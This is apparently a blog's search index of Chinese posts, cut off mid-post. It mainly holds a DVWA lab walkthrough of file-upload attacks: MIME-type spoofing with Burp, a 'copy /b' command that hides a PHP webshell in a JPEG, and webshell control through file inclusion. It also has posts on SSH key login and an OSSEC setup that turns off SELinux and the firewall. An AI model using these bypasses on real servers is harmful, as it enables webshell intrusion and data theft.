<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文件上传漏洞原理</title>
      <link href="/2019/03/30/201940/"/>
      <url>/2019/03/30/201940/</url>
      
        <content type="html"><![CDATA[<h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">目标靶机:OWASP_Broken_Web_Apps_VM_1<span class="meta">.2</span></span><br><span class="line"><span class="symbol">IP:</span><span class="number">192.168</span><span class="meta">.0</span><span class="meta">.109</span></span><br><span class="line"></span><br><span class="line">测试渗透机：kali-linux-<span class="number">2018</span>-<span class="number">4</span>-vm-amd64</span><br><span class="line"><span class="symbol">IP:</span><span class="number">192.168</span><span class="meta">.0</span><span class="meta">.103</span></span><br></pre></td></tr></table></figure><a id="more"></a><h4 id="文件上传原理"><a href="#文件上传原理" class="headerlink" title="文件上传原理"></a>文件上传原理</h4><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kga8jud2j30pb07zmxs.jpg" alt=""><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、文件上传（File Upload）是大部分web应用都具备的功能，如：用户上传的附件、修改头像、分享图片/视频等</span><br><span class="line"><span class="number">2</span>、正常的文件一般是文档、图片、视频等，web应用收集之后放入后台存储，需要的时候调用出来返回</span><br><span class="line"><span class="number">3</span>、如果恶意的文件如PHP、ASP等执行文件绕过web应用，并顺利执行，则相当于黑客直接拿到webshell</span><br><span class="line"><span class="number">4</span>、一旦黑客拿到webshell，则可以拿到web应用的数据，删除web文件，本地提权，进一步拿下整个服务器甚至内网</span><br><span class="line"><span class="number">5</span>、SQL注入攻击的对象是数据库服务，文件上传漏洞主要攻击web服务，实际渗透两种相结合，达到对目标的深度控制</span><br></pre></td></tr></table></figure></p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><h5 id="实验一（low）"><a href="#实验一（low）" class="headerlink" title="实验一（low）"></a>实验一（low）</h5><p>进入靶机环境<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgaji2dxj313j0lodim.jpg" alt=""><br>这里提示选择你要上传的图像，我们上传一张jpg图片文件<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgar6ui6j313j0lo77k.jpg" alt=""><br>提示上传成功，我们查看一下<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgaz7jz4j313j0lo4ae.jpg" alt=""><br>再次尝试上传一个11.txt的文本文件，看是否限制上传<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgb5l9grj313j0lo0vw.jpg" alt=""><br>提示上传成功，我们查看一下<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgbd3nrzj313j0lodht.jpg" alt=""><br>此时我们上传一个一句话木马的PHP可执行文件，看是否限制上传<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgbjiwqtj313j0lodj8.jpg" alt=""><br>提示成功上传，我们查看一下<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgbpg2vnj313j0logno.jpg" alt=""><br>此时亮出我们的中国菜刀<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgbvcm0tj31080g8my2.jpg" alt=""><br>成功进入<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgc1fj8nj31080g8my1.jpg" alt=""><br>我们来分析下靶机源码<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgc6pa3yj30pa0ejaam.jpg" alt=""><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'Upload'</span>])) &#123;<span class="comment">//判断是否有post提交过来的变量</span></span><br><span class="line"></span><br><span class="line">            $target_path = DVWA_WEB_PAGE_TO_ROOT.<span class="string">"hackable/uploads/"</span>;<span class="comment">//设置上传目录</span></span><br><span class="line">            $target_path = $target_path . basename( $_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>]);<span class="comment">//获取上传文件名</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'uploaded'</span>][<span class="string">'tmp_name'</span>], $target_path)) &#123;<span class="comment">//将上传的文件移动到新位置</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Your image was not uploaded.'</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">                </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">                <span class="keyword">echo</span> $target_path . <span class="string">' succesfully uploaded!'</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">低安全模式下</span><br><span class="line">没有验证文件上传类型，后缀名，可以任意上传文件及文件大小</span><br></pre></td></tr></table></figure><h5 id="实验二（medium）"><a href="#实验二（medium）" class="headerlink" title="实验二（medium）"></a>实验二（medium）</h5><p>进入靶机环境<br>上传一张jpg图片文件，成功上传<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgch4jiwj313j0logou.jpg" alt=""><br>上传一个PHP可执行文件，提示<font color="#660000">Your image was not uploaded.</font><br><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgclximjj313j0load1.jpg" alt=""><br>我们来分析下靶机源码<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgcqzi5uj30zt0ikq5k.jpg" alt=""><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'Upload'</span>])) &#123; <span class="comment">//判断是否有post提交过来的变量</span></span><br><span class="line"></span><br><span class="line">            $target_path = DVWA_WEB_PAGE_TO_ROOT.<span class="string">"hackable/uploads/"</span>; <span class="comment">//设置上传目录</span></span><br><span class="line">            $target_path = $target_path . basename($_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>]); <span class="comment">//获取上传文件名</span></span><br><span class="line">            $uploaded_name = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>]; <span class="comment">//客户端文件的原名称</span></span><br><span class="line">            $uploaded_type = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'type'</span>]; <span class="comment">//文件的MIME类型</span></span><br><span class="line">            $uploaded_size = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'size'</span>]; <span class="comment">//已上传文件的字节大小</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (($uploaded_type == <span class="string">"image/jpeg"</span>) &amp;&amp; ($uploaded_size &lt; <span class="number">100000</span>))&#123; <span class="comment">//进行了一个MIME类型及文件大小判断</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'uploaded'</span>][<span class="string">'tmp_name'</span>], $target_path)) &#123; <span class="comment">//将上传的文件移动到新位置</span></span><br><span class="line">                 </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'Your image was not uploaded.'</span>; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>; </span><br><span class="line">                     </span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">                 </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>; </span><br><span class="line">                    <span class="keyword">echo</span> $target_path . <span class="string">' succesfully uploaded!'</span>; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>; </span><br><span class="line">                     </span><br><span class="line">                    &#125; </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">中安全模式下</span><br><span class="line">对文件上传的MIME类型及大小进行了一个判断</span><br></pre></td></tr></table></figure><p>此时，我们可以用burp suite抓包来做一个对比<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgd5fcbqj30no0eq77u.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgdbqiwmj30np0exdja.jpg" alt=""><br>利用burp suite抓包进行修改Content-Type值为imge/jpeg进行上传<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgdgz9whj30n60eqgo0.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgdly8p3j314w0nk77l.jpg" alt=""><br>上菜刀<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgdszd1sj31080g8gm7.jpg" alt=""></p><h5 id="实验三（high）"><a href="#实验三（high）" class="headerlink" title="实验三（high）"></a>实验三（high）</h5><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgdyl3a6j30jj08kjrs.jpg" alt=""><br>尝试上述方法，全部失败，不在赘述<br>查看靶机源码<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kge57xdoj30tk0j0my0.jpg" alt=""><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'Upload'</span>])) &#123;<span class="comment">//判断是否有post提交过来的变量</span></span><br><span class="line"></span><br><span class="line">            $target_path = DVWA_WEB_PAGE_TO_ROOT.<span class="string">"hackable/uploads/"</span>;<span class="comment">//设置上传目录</span></span><br><span class="line">            $target_path = $target_path . basename($_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>]);<span class="comment">//获取上传文件名</span></span><br><span class="line">            $uploaded_name = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>];<span class="comment">//客户端文件的原名称($_FILES['file']['name']在得到文件名时0x00【%00截断】之后的内容已经不见了，如果在此基础上判断后缀名是否合法，则肯定不能通过。)</span></span><br><span class="line">            $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, <span class="string">'.'</span>) + <span class="number">1</span>);<span class="comment">//取文件最后的扩展名</span></span><br><span class="line">            $uploaded_size = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'size'</span>];<span class="comment">//已上传文件的字节大小</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (($uploaded_ext == <span class="string">"jpg"</span> || $uploaded_ext == <span class="string">"JPG"</span> || $uploaded_ext == <span class="string">"jpeg"</span> || $uploaded_ext == <span class="string">"JPEG"</span>) &amp;&amp; ($uploaded_size &lt; <span class="number">100000</span>))&#123;<span class="comment">//采取白名单方式验证文件的后缀名以及文件大小</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'uploaded'</span>][<span class="string">'tmp_name'</span>], $target_path)) &#123;<span class="comment">//将上传的文件移动到新位置</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'Your image was not uploaded.'</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">                </span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">                    <span class="keyword">echo</span> $target_path . <span class="string">' succesfully uploaded!'</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Your image was not uploaded.'</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">高安全模式下</span><br><span class="line">后台检测上传文件后缀名<span class="comment">(采取白名单)</span></span><br></pre></td></tr></table></figure><p>这里我们结合<strong>文件包含漏洞</strong><br>使用dos命令制作一句话图片木马<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy shell<span class="selector-class">.jpg</span> /b+ xiaowei<span class="selector-class">.php</span> shell3.jpg</span><br><span class="line">--/<span class="selector-tag">b</span> 以二进制的形式进行复制、合并文件。</span><br><span class="line">--/<span class="selector-tag">a</span> 以ASCII的形式进行复制、合并文件。</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kged4syej30zx0rg0vx.jpg" alt=""><br>将制作好的一句话图片木马进行上传<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgeqx8bwj312b0o0mz1.jpg" alt=""><br>结合文件包含漏洞，直接包含该文件会将该文件以PHP来运行：<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgezn6arj312b0o0di3.jpg" alt=""><br>上菜刀<br>此时，你可能会遇到这样子的问题<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgf5xd1lj30zk0fkt92.jpg" alt=""></p><p><font color="#660000">（根据排查初步断定菜刀没有进行一个身份认证，导致返回了一个200状态码的，一个登陆界面源码）</font><br><br>此时我们利用菜刀的浏览器登陆下我们的靶机环境，让它产生cookie<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgffjkkzj30w90fmwey.jpg" alt=""><br>我们再次进行我们的一句话连接<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgflbd1vj30xt0fgq3n.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记</title>
      <link href="/2019/03/18/201939/"/>
      <url>/2019/03/18/201939/</url>
      
        <content type="html"><![CDATA[<p><iframe id="embed_dom" name="embed_dom" frameborder="0" style="display:block;width:100%; height:600px;" src="https://www.processon.com/embed/mind/5c0a7900e4b0e4a514241578"></iframe><br><a id="more"></a><br>一款挺好的在线创作的思维导图、流程图等<br><a href="https://www.processon.com/i/5c09c763e4b0ca4b40cae793" target="_blank" rel="noopener">https://www.processon.com/i/5c09c763e4b0ca4b40cae793</a></p><p>PNG格式<br><a href="http://assets.processon.com/chart_image/5c0a7900e4b0e4a51424157b.png" target="_blank" rel="noopener">http://assets.processon.com/chart_image/5c0a7900e4b0e4a51424157b.png</a><br>PDF格式<br>链接： <a href="https://pan.baidu.com/s/13Tbkr67sSZltMQ6d6f2YoA" target="_blank" rel="noopener">https://pan.baidu.com/s/13Tbkr67sSZltMQ6d6f2YoA</a><br>提取码： on0o </p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 思维导图 </tag>
            
            <tag> 笔记 </tag>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh基于密钥认证登陆</title>
      <link href="/2019/03/12/201938/"/>
      <url>/2019/03/12/201938/</url>
      
        <content type="html"><![CDATA[<p>基于密钥的认证<br><a id="more"></a></p><h4 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h4><pre><code>OS:centos7连接工具：xshellIP:192.168.0.120</code></pre><h4 id="生成ssh认证的私钥和公钥"><a href="#生成ssh认证的私钥和公钥" class="headerlink" title="生成ssh认证的私钥和公钥"></a>生成ssh认证的私钥和公钥</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh-keygen</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgghlzltj30ia09wq35.jpg" alt=""></p><h5 id="将公钥制作成key"><a href="#将公钥制作成key" class="headerlink" title="将公钥制作成key"></a>将公钥制作成key</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv id_rsa<span class="selector-class">.pub</span> authorized_keys</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kggn7vgjj30fb05et8m.jpg" alt=""></p><h5 id="将私钥下载到本地"><a href="#将私钥下载到本地" class="headerlink" title="将私钥下载到本地"></a>将私钥下载到本地</h5><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kggt5ntuj313u0ij3z4.jpg" alt=""></p><h5 id="编辑配置文件允许公钥认证，关闭口令认证"><a href="#编辑配置文件允许公钥认证，关闭口令认证" class="headerlink" title="编辑配置文件允许公钥认证，关闭口令认证"></a>编辑配置文件允许公钥认证，关闭口令认证</h5><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgh0cme3j30v80gwmxw.jpg" alt=""></p><h5 id="重启ssh服务"><a href="#重启ssh服务" class="headerlink" title="重启ssh服务"></a>重启ssh服务</h5><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">service sshd restart</span></span><br></pre></td></tr></table></figure><h4 id="利用密钥进行连接"><a href="#利用密钥进行连接" class="headerlink" title="利用密钥进行连接"></a>利用密钥进行连接</h4><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgh6mwp0j30c50b0t8z.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kghfaj8fj30v80gwglo.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> SSH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> Centos7 </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSSEC安装部署</title>
      <link href="/2019/03/12/201937/"/>
      <url>/2019/03/12/201937/</url>
      
        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>OSSEC是一款开源的多平台的入侵检测系统，可以运行于Windows, Linux, OpenBSD/FreeBSD, 以及 MacOS等操作系统中。包括了日志分析，全面检测，root-kit检测，实时报警以及联动响应等功能。</p><a id="more"></a><h3 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h3><h4 id="服务端-server"><a href="#服务端-server" class="headerlink" title="服务端(server)"></a>服务端(server)</h4><pre><code>OS:Centos7IP:192.168.0.120</code></pre><h4 id="客户端1-agent1"><a href="#客户端1-agent1" class="headerlink" title="客户端1(agent1)"></a>客户端1(agent1)</h4><pre><code>OS:Centos7IP:192.168.0.110</code></pre><h4 id="客户端2-agent2"><a href="#客户端2-agent2" class="headerlink" title="客户端2(agent2)"></a>客户端2(agent2)</h4><pre><code>OS:Microsoft Windows 10 EducationIP:192.168.0.102</code></pre><h3 id="OSSEC服务端环境部署"><a href="#OSSEC服务端环境部署" class="headerlink" title="OSSEC服务端环境部署"></a>OSSEC服务端环境部署</h3><h4 id="更换软件安装源"><a href="#更换软件安装源" class="headerlink" title="更换软件安装源"></a>更换软件安装源</h4><p>Centos7更换软件安装源：<a href="https://axiaowei.cn/2019/03/12/201936/#more">https://axiaowei.cn/2019/03/12/201936/#more</a></p><h4 id="关闭内置安全子系统"><a href="#关闭内置安全子系统" class="headerlink" title="关闭内置安全子系统"></a>关闭内置安全子系统</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 临时关闭，立即生效。（重启失效）</span></span><br><span class="line">setenforce 0</span><br><span class="line"><span class="comment"># 修改配置文件，重启后生效。</span></span><br><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line">将<span class="attribute">SELINUX</span>=enforcing</span><br><span class="line">修改为<span class="attribute">SELINUX</span>=disabled</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kgj7jrafj30zc08h74k.jpg" alt=""></p><h4 id="关闭防火墙-firewall"><a href="#关闭防火墙-firewall" class="headerlink" title="关闭防火墙(firewall)"></a>关闭防火墙(firewall)</h4><p><strong>注意:如果这里需要开启防火墙需要放行相对应的端口</strong><br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 停止firewalld</span></span><br><span class="line">systemctl <span class="keyword">stop</span> firewalld</span><br><span class="line"><span class="meta"># 禁止开机自启</span></span><br><span class="line">systemctl <span class="keyword">disable</span> firewalld</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khcddg8bj30id03lwef.jpg" alt=""></p><h4 id="安装关联的库以及软件"><a href="#安装关联的库以及软件" class="headerlink" title="安装关联的库以及软件"></a>安装关联的库以及软件</h4><h5 id="数据库以及支持库安装"><a href="#数据库以及支持库安装" class="headerlink" title="数据库以及支持库安装"></a>数据库以及支持库安装</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> mariadb-<span class="keyword">server</span> -y</span><br><span class="line">yum <span class="keyword">install</span> mariadb-devel -y</span><br></pre></td></tr></table></figure><p>具体内容可参考官方文档：<a href="https://mariadb.com/kb/en/library/about-the-mariadb-rpm-files/" target="_blank" rel="noopener">https://mariadb.com/kb/en/library/about-the-mariadb-rpm-files/</a><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khdcofmjj30zq0f43zl.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khdleux7j30zq0f4wfj.jpg" alt=""></p><h5 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动数据库</span></span><br><span class="line">systemctl start mariadb</span><br><span class="line"><span class="comment"># 设置mariadb开机自启</span></span><br><span class="line">systemctl <span class="builtin-name">enable</span> mariadb</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khf8hge5j30pn029a9y.jpg" alt=""></p><h6 id="运行mysql-secure-installation执行几个设置"><a href="#运行mysql-secure-installation执行几个设置" class="headerlink" title="运行mysql_secure_installation执行几个设置:"></a>运行mysql_secure_installation执行几个设置:</h6><font color="#dd0000" size="1">–为root用户设置密码</font><br><font color="#dd0000" size="1">–删除匿名账号</font><br><font color="#dd0000" size="1">–取消root用户的远程登陆</font><br><font color="#dd0000" size="1">–删除test库</font><br><font color="#dd0000" size="1">–刷新授权使其修改生效</font> <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql_secure_installation</span><br><span class="line">Enter current password <span class="keyword">for</span> root (enter <span class="keyword">for</span> <span class="literal">none</span>):&lt;–初次运行直接回车</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n]    <span class="comment">#是否设置root用户密码，输入y并回车或直接回车</span></span><br><span class="line">New password:               <span class="comment">#设置root用户的密码</span></span><br><span class="line">Re-enter <span class="built_in">new</span> password:      <span class="comment">#再输入一次你设置的密码</span></span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n]   <span class="comment">#是否删除匿名用户</span></span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n] <span class="comment">#是否禁止root远程登录,根据自己的需求选择Y/n并回车,建议禁止</span></span><br><span class="line"></span><br><span class="line">Remove test database <span class="keyword">and</span> access <span class="built_in">to</span> <span class="keyword">it</span>? [Y/n] <span class="comment">#是否删除test数据库</span></span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n] <span class="comment">#是否重新加载权限表</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khds08ntj30j90mlq3z.jpg" alt=""></p><h6 id="登陆数据库，创建ossec库"><a href="#登陆数据库，创建ossec库" class="headerlink" title="登陆数据库，创建ossec库"></a>登陆数据库，创建ossec库</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建库</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> ossec;</span><br><span class="line"><span class="comment"># 查看数据库</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khgp3tlvj30sn0gx0t1.jpg" alt=""></p><h6 id="创建ossec用户，密码为ossec，并给予ossec数据库的所有权限"><a href="#创建ossec用户，密码为ossec，并给予ossec数据库的所有权限" class="headerlink" title="创建ossec用户，密码为ossec，并给予ossec数据库的所有权限"></a>创建ossec用户，密码为ossec，并给予ossec数据库的所有权限</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 